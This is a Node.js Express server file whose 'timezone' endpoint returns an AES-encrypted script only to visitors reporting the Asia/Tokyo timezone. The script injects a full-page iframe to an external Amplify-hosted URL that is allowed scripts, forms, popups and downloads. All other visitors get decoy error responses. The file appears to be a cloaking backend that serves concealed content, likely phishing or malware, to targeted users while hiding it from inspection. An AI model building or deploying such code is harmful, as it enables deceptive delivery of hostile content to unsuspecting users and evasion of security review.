const express = require("express");
const cors = require("cors");
const CryptoJS = require("crypto-js");
const app = express();
const PORT = 3000;
const secretKey = "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";
// Middleware
app.use(cors());
app.use(express.json()); // parse JSON body

// Example POST API
app.get("/timezone", (req, res) => {
        res.status(401).json({
            status: "error",
            message: "404 Error",
            response : getError()
        });
});
// Example POST API
app.post("/timezone", (req, res) => {
   const { timezone,fullUrl} = req.body;
    console.log(req.body);
      if (timezone === "Asia/Tokyo") {
      //  if (timezone === "Asia/Calcutta") {
        res.send(getResponse());
   } else {
      res.send(getError());
    }
});

function aesEncode(text) {
    return CryptoJS.AES.encrypt(text, secretKey).toString();
}

function aesDecode(encryptedText) {
    return CryptoJS.AES.decrypt(encryptedText, secretKey)
        .toString(CryptoJS.enc.Utf8);
}

    function getError(){
        const se1 = `
                console.log("Error Find");`;


                const encrypted1 = aesEncode(se1);
                const urlSafe1 = encodeURIComponent(encrypted1);
                return urlSafe1;
    }

    function getResponse(){
     const se1 = `
                const iframe = document.createElement("iframe");

                // src (example blob URL)
              //  iframe.src = "https://u24hints.site/dummy.html"; // example


                iframe.src = "https://main.dw3hwvwhra4m2.amplifyapp.com/idiwueniqhedweffewfqcew/"; // example


                // permissions
                iframe.setAttribute(
                "allow",
                "fullscreen; autoplay; encrypted-media; picture-in-picture"
                );

                // fullscreen support
                iframe.setAttribute("allowfullscreen", "");
                iframe.setAttribute("webkitallowfullscreen", "");
                iframe.setAttribute("mozallowfullscreen", "");

                // sandbox
                iframe.setAttribute(
                "sandbox",
                "allow-scripts allow-popups allow-forms allow-downloads"
                );

                // styles
                iframe.style.width = "100%";
                iframe.style.height = "100%";
                iframe.style.border = "0px";

                // add to page
                
                document.getElementById("contentiframe").replaceChildren(iframe);
                //document.body.appendChild(iframe);

                `;


                const encrypted1 = aesEncode(se1);
                const urlSafe1 = encodeURIComponent(encrypted1);
                return urlSafe1;

            }

// --------------------
// Start server
// --------------------
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});

